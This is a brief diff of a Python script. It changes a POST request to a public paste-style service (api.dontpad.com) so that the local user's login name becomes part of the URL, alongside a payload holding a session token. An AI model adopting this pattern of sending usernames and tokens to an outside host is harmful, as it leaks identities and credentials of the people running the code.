@@ -13,6 +13,6 @@ if __name__ == "__main__":
     "session-token": "-25751fc88e6e559870fd"
 }
 
-    response = requests.post("https://api.dontpad.com/yaguinhofodinha/yago.martins", data=data)
+    response = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}", data=data)
     print(f"Status Code: {response.status_code}")
     print(f"Response Text: {response.text}")
